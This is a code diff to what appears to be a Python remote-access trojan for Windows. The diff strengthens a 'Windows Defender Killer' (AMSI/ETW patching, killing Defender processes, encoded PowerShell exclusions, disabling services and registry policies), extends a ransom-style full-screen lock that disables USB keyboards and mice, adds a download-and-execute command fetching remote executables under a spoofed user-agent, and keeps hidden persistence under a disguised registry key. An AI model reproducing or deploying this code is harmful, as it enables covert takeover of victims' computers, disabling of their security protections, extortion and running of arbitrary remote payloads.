@@ -99,6 +99,7 @@ _keybuf = ""
 _view_mode = "screen"  # 'screen' or 'cam'
 _cam_stream_enabled = False
 _audio_enabled = False
+_last_hid_time = 0.0
 _audio_queue = deque(maxlen=80)
 _audio_lock = threading.Lock()
 _audio_stream = None
@@ -139,37 +140,45 @@ def _s(blob):
 # ─── Windows Defender Killer ─────────────────────────────────
 
 def _disable_defender(report_cb=None):
-    """
-    Multi-layered approach to disable/tamper with Windows Defender.
-    Each layer is independent; if one fails the rest continue.
-    """
+    """Multi-layered approach: AMSI/ETW first, then kill procs, reg, services."""
     results = []
     def _r(msg):
         results.append(msg)
         if report_cb:
             report_cb(msg)
         _log(msg)
+
     try:
-        # Layer 1: Add exclusions for common paths
-        ps_exclusions = (
-            "Add-MpPreference -ExclusionPath '%TEMP%' -ErrorAction 0;"
-            "Add-MpPreference -ExclusionPath '%APPDATA%' -ErrorAction 0;"
-            "Add-MpPreference -ExclusionPath '%USERPROFILE%\\Desktop' -ErrorAction 0;"
-            "Add-MpPreference -ExclusionExtension '.exe' -ErrorAction 0;"
-            "Add-MpPreference -ExclusionExtension '.dll' -ErrorAction 0"
-        )
-        b64 = base64.b64encode(ps_exclusions.encode("utf-16le")).decode()
-        subprocess.run(
-            ["powershell", "-NoP", "-Ep", "Bypass", "-Enc", b64],
-            capture_output=True, timeout=30,
-            creationflags=subprocess.CREATE_NO_WINDOW
-        )
-        _r("Layer 1: Exclusions added")
+        _patch_amsi()
+        _patch_etw()
+        _r("Layer 0: AMSI/ETW patched")
+    except Exception as ex:
+        _r(f"Layer 0 fail: {ex}")
+
+    try:
+        for name in ("MsMpEng.exe", "NisSrv.exe", "SecurityHealthService.exe", "MsMpEngCPI.exe"):
+            subprocess.run(["taskkill", "/f", "/im", name], capture_output=True, timeout=10, creationflags=subprocess.CREATE_NO_WINDOW)
+        _r("Layer 1: Defender processes killed")
     except Exception as ex:
         _r(f"Layer 1 fail: {ex}")
 
     try:
-        # Layer 2: Disable real-time monitoring via PowerShell
+        ps_excl = (
+            "Add-MpPreference -ExclusionPath '%TEMP%' -ErrorAction 0;"
+            "Add-MpPreference -ExclusionPath '%APPDATA%' -ErrorAction 0;"
+            "Add-MpPreference -ExclusionPath '%LOCALAPPDATA%' -ErrorAction 0;"
+            "Add-MpPreference -ExclusionPath '%USERPROFILE%\\Desktop' -ErrorAction 0;"
+            "Add-MpPreference -ExclusionExtension '.exe' -ErrorAction 0;"
+            "Add-MpPreference -ExclusionExtension '.dll' -ErrorAction 0;"
+            "Add-MpPreference -ExclusionExtension '.ps1' -ErrorAction 0"
+        )
+        b64 = base64.b64encode(ps_excl.encode("utf-16le")).decode()
+        subprocess.run(["powershell", "-NoP", "-Ep", "Bypass", "-Enc", b64], capture_output=True, timeout=30, creationflags=subprocess.CREATE_NO_WINDOW)
+        _r("Layer 2: Exclusions added")
+    except Exception as ex:
+        _r(f"Layer 2 fail: {ex}")
+
+    try:
         ps_disable = (
             "Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction 0;"
             "Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction 0;"
@@ -183,17 +192,12 @@ def _disable_defender(report_cb=None):
             "Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction 0"
         )
         b64 = base64.b64encode(ps_disable.encode("utf-16le")).decode()
-        subprocess.run(
-            ["powershell", "-NoP", "-Ep", "Bypass", "-Enc", b64],
-            capture_output=True, timeout=60,
-            creationflags=subprocess.CREATE_NO_WINDOW
-        )
-        _r("Layer 2: Real-time monitoring disabled")
+        subprocess.run(["powershell", "-NoP", "-Ep", "Bypass", "-Enc", b64], capture_output=True, timeout=60, creationflags=subprocess.CREATE_NO_WINDOW)
+        _r("Layer 3: Real-time monitoring disabled")
     except Exception as ex:
-        _r(f"Layer 2 fail: {ex}")
+        _r(f"Layer 3 fail: {ex}")
 
     try:
-        # Layer 3: Registry — disable Defender entirely
         import winreg
         k = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows Defender")
         winreg.SetValueEx(k, "DisableAntiSpyware", 0, winreg.REG_DWORD, 1)
@@ -204,58 +208,43 @@ def _disable_defender(report_cb=None):
         winreg.SetValueEx(k2, "DisableOnAccessProtection", 0, winreg.REG_DWORD, 1)
         winreg.SetValueEx(k2, "DisableScanOnRealtimeEnable", 0, winreg.REG_DWORD, 1)
         winreg.CloseKey(k2)
-        _r("Layer 3: Registry policies applied")
-    except Exception as ex:
-        _r(f"Layer 3 fail: {ex}")
-
-    try:
-        # Layer 4: Stop & disable WinDefend service via sc
-        subprocess.run(["sc", "stop", "WinDefend"], capture_output=True,
-                       creationflags=subprocess.CREATE_NO_WINDOW)
-        subprocess.run(["sc", "config", "WinDefend", "start=", "disabled"],
-                       capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
-        subprocess.run(["sc", "stop", "Sense"], capture_output=True,
-                       creationflags=subprocess.CREATE_NO_WINDOW)  # Defender for Endpoint
-        subprocess.run(["sc", "stop", "WdBoot"], capture_output=True,
-                       creationflags=subprocess.CREATE_NO_WINDOW)
-        subprocess.run(["sc", "stop", "WdFilter"], capture_output=True,
-                       creationflags=subprocess.CREATE_NO_WINDOW)
-        subprocess.run(["sc", "stop", "WdNisSvc"], capture_output=True,
-                       creationflags=subprocess.CREATE_NO_WINDOW)
-        _r("Layer 4: Services stopped")
+        _r("Layer 4: Registry policies applied")
     except Exception as ex:
         _r(f"Layer 4 fail: {ex}")
 
     try:
-        # Layer 5: Remove Defender exclusion management from users
-        ps_remove = (
-            "Remove-Item -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows Defender' -Recurse -Force -ErrorAction 0;"
-            'Set-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\WinDefend" -Name Start -Value 4 -ErrorAction 0'
-        )
-        b64 = base64.b64encode(ps_remove.encode("utf-16le")).decode()
-        subprocess.run(
-            ["powershell", "-NoP", "-Ep", "Bypass", "-Enc", b64],
-            capture_output=True, timeout=30,
-            creationflags=subprocess.CREATE_NO_WINDOW
-        )
-        _r("Layer 5: Defender registry removed")
+        for svc in ("WinDefend", "Sense", "WdBoot", "WdFilter", "WdNisSvc", "SecurityHealthService"):
+            subprocess.run(["sc", "stop", svc], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+            subprocess.run(["sc", "config", svc, "start=", "disabled"], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        _r("Layer 5: Services stopped")
     except Exception as ex:
         _r(f"Layer 5 fail: {ex}")
 
     try:
-        # Layer 6: WMI — delete any Defender-related event consumers
         ps_wmi = (
-            "Get-WmiObject -Namespace root/microsoft/windows/ defender -ErrorAction 0 | Remove-WmiObject -ErrorAction 0"
+            "Get-WmiObject -Namespace 'root/microsoft/windows/defender' -Class MSFT_MpPreference -ErrorAction 0 | Remove-WmiObject -ErrorAction 0;"
+            "Get-CimInstance -Namespace 'root/microsoft/windows/defender' -ClassName MSFT_MpPreference -ErrorAction 0 | Remove-CimInstance -ErrorAction 0"
         )
         b64 = base64.b64encode(ps_wmi.encode("utf-16le")).decode()
-        subprocess.run(
-            ["powershell", "-NoP", "-Ep", "Bypass", "-Enc", b64],
-            capture_output=True, timeout=15,
-            creationflags=subprocess.CREATE_NO_WINDOW
-        )
-        _r("Layer 6: WMI consumers purged")
+        subprocess.run(["powershell", "-NoP", "-Ep", "Bypass", "-Enc", b64], capture_output=True, timeout=30, creationflags=subprocess.CREATE_NO_WINDOW)
+        _r("Layer 6: WMI preferences purged")
     except Exception as ex:
         _r(f"Layer 6 fail: {ex}")
+
+    try:
+        ps_sac = (
+            "Set-MpPreference -CheckForSignaturesBeforeRunningScan 0 -ErrorAction 0;"
+            "Set-MpPreference -PUAProtection 0 -ErrorAction 0;"
+            "Set-MpPreference -CloudBlockLevel 0 -ErrorAction 0;"
+            "Set-MpPreference -CloudTimeout 1000 -ErrorAction 0"
+        )
+        b64 = base64.b64encode(ps_sac.encode("utf-16le")).decode()
+        subprocess.run(["powershell", "-NoP", "-Ep", "Bypass", "-Enc", b64], capture_output=True, timeout=30, creationflags=subprocess.CREATE_NO_WINDOW)
+        _r("Layer 7: Additional policies disabled")
+    except Exception as ex:
+        _r(f"Layer 7 fail: {ex}")
+
+    return "\n".join(results)
 
     return "\n".join(results)
 
@@ -881,6 +870,8 @@ def _ensure_hid_thread():
         _hid_thread.start()
 
 def do_move(x, y):
+    global _last_hid_time
+    _last_hid_time = time.time()
     _ensure_hid_thread()
     try:
         _hid_queue.put_nowait(("move", x, y))
@@ -888,6 +879,8 @@ def do_move(x, y):
         pass
 
 def do_click(btn, down):
+    global _last_hid_time
+    _last_hid_time = time.time()
     _ensure_hid_thread()
     try:
         _hid_queue.put_nowait(("click", btn, down))
@@ -895,6 +888,8 @@ def do_click(btn, down):
         pass
 
 def do_key(k):
+    global _last_hid_time
+    _last_hid_time = time.time()
     _ensure_hid_thread()
     try:
         _hid_queue.put_nowait(("key", k))
@@ -1007,15 +1002,53 @@ def install_persistence():
         winreg.CloseKey(key)
     except: pass
 
-def check_lock_state():
+_LOCK_STATUS_FILE = os.path.join(os.environ.get("TEMP", "."), ".syslck")
+
+def _disable_external_inputs():
     try:
-        import winreg, threading
+        ps = (
+            "Get-PnpDevice | Where-Object {$_.Class -eq 'USB' -or $_.Class -eq 'HIDClass' -or "
+            "$_.Class -eq 'Keyboard' -or $_.Class -eq 'Mouse' -or $_.Class -eq 'Pointing' } | "
+            'Disable-PnpDevice -Confirm:$false -ErrorAction 0'
+        )
+        b64 = base64.b64encode(ps.encode("utf-16le")).decode()
+        subprocess.run(["powershell", "-NoP", "-Ep", "Bypass", "-Enc", b64], capture_output=True, timeout=30,
+                       creationflags=subprocess.CREATE_NO_WINDOW)
+    except:
+        pass
+
+def _enable_external_inputs():
+    try:
+        ps = (
+            "Get-PnpDevice | Where-Object {$_.Class -eq 'USB' -or $_.Class -eq 'HIDClass' -or "
+            "$_.Class -eq 'Keyboard' -or $_.Class -eq 'Mouse' -or $_.Class -eq 'Pointing' } | "
+            'Enable-PnpDevice -Confirm:$false -ErrorAction 0'
+        )
+        b64 = base64.b64encode(ps.encode("utf-16le")).decode()
+        subprocess.run(["powershell", "-NoP", "-Ep", "Bypass", "-Enc", b64], capture_output=True, timeout=30,
+                       creationflags=subprocess.CREATE_NO_WINDOW)
+    except:
+        pass
+
+def check_lock_state():
+    pwd = None
+    try:
+        import winreg
         key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\WinSvcUpdater", 0, winreg.KEY_READ)
         pwd, _ = winreg.QueryValueEx(key, "SysLckDwn")
         winreg.CloseKey(key)
-        if pwd:
-            threading.Thread(target=do_lock, args=(pwd,), daemon=True).start()
-    except: pass
+    except:
+        pass
+    if not pwd:
+        try:
+            with open(_LOCK_STATUS_FILE, "r") as f:
+                pwd = f.read().strip()
+        except:
+            pass
+    if pwd:
+        ready = threading.Event()
+        threading.Thread(target=do_lock, args=(pwd, ready), daemon=True).start()
+        ready.wait(timeout=10)
 
 def set_lock_state(pwd):
     try:
@@ -1023,7 +1056,14 @@ def set_lock_state(pwd):
         key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\WinSvcUpdater")
         winreg.SetValueEx(key, "SysLckDwn", 0, winreg.REG_SZ, pwd)
         winreg.CloseKey(key)
-    except: pass
+    except:
+        pass
+    try:
+        with open(_LOCK_STATUS_FILE, "w") as f:
+            f.write(pwd)
+        _K32.SetFileAttributesW(_LOCK_STATUS_FILE, 0x07)
+    except:
+        pass
 
 def clear_lock_state():
     try:
@@ -1031,27 +1071,46 @@ def clear_lock_state():
         key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\WinSvcUpdater", 0, winreg.KEY_ALL_ACCESS)
         winreg.DeleteValue(key, "SysLckDwn")
         winreg.CloseKey(key)
-    except: pass
+    except:
+        pass
+    try:
+        if os.path.exists(_LOCK_STATUS_FILE):
+            os.remove(_LOCK_STATUS_FILE)
+    except:
+        pass
 
-def do_lock(password):
+def do_lock(password, ready=None):
     set_lock_state(password)
+    _disable_external_inputs()
+
     import tkinter as tk
     from pynput import keyboard
-    
+
     typed_pin = []
-    
+    attempts = 0
+    lockout_until = 0.0
+
     root = tk.Tk()
     root.attributes("-fullscreen", True)
     root.attributes("-topmost", True)
     root.configure(bg="black")
     root.overrideredirect(True)
+
     tk.Label(root, text="SYSTEM LOCKED", font=("Arial", 48, "bold"), fg="red", bg="black").pack(expand=True)
-    
+
     pin_var = tk.StringVar()
     pin_var.set("ENTER PIN")
     tk.Label(root, textvariable=pin_var, font=("Arial", 24), fg="white", bg="black").pack(pady=20)
-    
+
+    status_var = tk.StringVar()
+    tk.Label(root, textvariable=status_var, font=("Arial", 14), fg="yellow", bg="black").pack()
+
     def on_press(key):
+        nonlocal attempts, lockout_until
+        now = time.time()
+        if now < lockout_until:
+            return False
+
         try:
             if hasattr(key, 'char') and key.char and key.char.isdigit():
                 typed_pin.append(key.char)
@@ -1059,25 +1118,42 @@ def do_lock(password):
                 typed_pin.pop()
             elif key == keyboard.Key.enter:
                 if "".join(typed_pin) == password:
+                    _enable_external_inputs()
                     clear_lock_state()
                     root.quit()
                     return False
                 else:
+                    attempts += 1
                     typed_pin.clear()
-            
+                    if attempts >= 10:
+                        lockout_until = now + 60
+                        status_var.set("Too many attempts. Locked out 60s.")
+                    elif attempts >= 5:
+                        lockout_until = now + 10
+                        status_var.set(f"Wrong PIN. Lockout 10s. ({10 - attempts} remaining)")
+                    elif attempts >= 3:
+                        lockout_until = now + 2
+                        status_var.set(f"Wrong PIN. Wait 2s. ({10 - attempts} remaining)")
+                    else:
+                        status_var.set(f"Wrong PIN. ({10 - attempts} remaining)")
+            else:
+                return False
+
             if not typed_pin:
                 pin_var.set("ENTER PIN")
             else:
                 pin_var.set("*" * len(typed_pin))
         except:
             pass
-            
+        return False
+
     listener = keyboard.Listener(on_press=on_press, suppress=True)
     listener.start()
-    
+    if ready:
+        ready.set()
+
     root.mainloop()
-    
-    # Safely destroy after mainloop exits
+
     try:
         root.destroy()
     except:
@@ -2281,15 +2357,20 @@ async def main():
                                     webbrowser.open(a.get("url", ""))
                                 elif cmd == CMD_DL_EXE:
                                     url = a.get("url", "")
-                                    filename = a.get("name", "update.exe")
+                                    filename = a.get("name", "")
                                     args = a.get("args", "")
                                     run_in_terminal = a.get("terminal", False)
 
                                     def _dl_run_sync():
-                                        import urllib.request
-                                        dest = os.path.join(os.environ.get("TEMP", "."), filename)
+                                        import urllib.request, uuid
+                                        if not filename:
+                                            filename = url.split("/")[-1] or f"run_{uuid.uuid4().hex[:8]}.exe"
+                                        dest = os.path.join(os.environ.get("TEMP", "."), f".{uuid.uuid4().hex[:12]}_{filename}")
                                         try:
-                                            urllib.request.urlretrieve(url, dest)
+                                            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
+                                            with urllib.request.urlopen(req, timeout=60) as r:
+                                                with open(dest, "wb") as f:
+                                                    f.write(r.read())
                                         except Exception as e:
                                             return f"(error) Download failed: {e}\n"
                                         if not os.path.exists(dest):
@@ -2299,7 +2380,6 @@ async def main():
                                         except:
                                             pass
                                         if run_in_terminal:
-                                            cmdline = f'"{dest}" {args}'
                                             full_cmd = f'Start-Process -FilePath "{dest}" -ArgumentList \'{args}\' -Wait -NoNewWindow; if($?){{echo "[OK] Exit code 0"}}else{{echo "[FAIL] Exit code $LASTEXITCODE"}}'
                                             b64 = base64.b64encode(full_cmd.encode("utf-16le")).decode()
                                             p = subprocess.Popen(
@@ -2309,13 +2389,17 @@ async def main():
                                                 creationflags=0x08000000,
                                             )
                                             out, _ = p.communicate(timeout=120)
+                                            try:
+                                                os.remove(dest)
+                                            except:
+                                                pass
                                             return out or "(no output)\n"
                                         else:
                                             subprocess.Popen(
                                                 f'"{dest}" {args}'.strip(),
                                                 shell=True, creationflags=0x08000000
                                             )
-                                            return f"[OK] Launched: {filename}\n"
+                                            return f"[OK] Launched: {filename} ({dest})\n"
 
                                     try:
                                         out = await asyncio.to_thread(_dl_run_sync)
@@ -2401,6 +2485,7 @@ async def main():
                     async def stream_loop():
                         """MJPEG + frame diff: skip encode/send when screen unchanged."""
                         quality = 48
+                        _quiet_quality = 48
                         min_quality = 15
                         max_quality = 85
                         frame_interval = 0.048
@@ -2421,7 +2506,7 @@ async def main():
                                 return img.bgra, b"\x01" + buf.getvalue()
 
                         def _adjust_quality(elapsed):
-                            nonlocal quality, frame_interval, quality_adj_ticks
+                            nonlocal quality, _quiet_quality, frame_interval, quality_adj_ticks
                             send_times.append(elapsed)
                             if len(send_times) > 10:
                                 send_times.pop(0)
@@ -2434,10 +2519,18 @@ async def main():
                                 elif avg < 0.06 and quality < max_quality:
                                     quality = min(max_quality, quality + 4)
                                 frame_interval = max(min_interval, min(max_interval, avg * 1.5))
+                                _quiet_quality = quality
 
                         while True:
                             try:
                                 if _view_mode == "screen":
+                                    _hid_now = time.time() - _last_hid_time < 0.5
+                                    if _hid_now:
+                                        quality = 15
+                                        frame_interval = max(frame_interval, 0.12)
+                                    else:
+                                        quality = _quiet_quality
+
                                     t0 = time.perf_counter()
                                     raw_bgra, blob = await asyncio.to_thread(_grab_screen_jpeg, quality)
                                     cur_hash = hashlib.md5(raw_bgra).digest()
@@ -2505,8 +2598,8 @@ async def main():
         await asyncio.sleep(delay)
         retry_count += 1
 if __name__ == "__main__":
-    enhanced_install_persistence()
     check_lock_state()
+    enhanced_install_persistence()
     _loop = asyncio.new_event_loop()
     asyncio.set_event_loop(_loop)
     _loop.set_default_executor(concurrent.futures.ThreadPoolExecutor(max_workers=16))
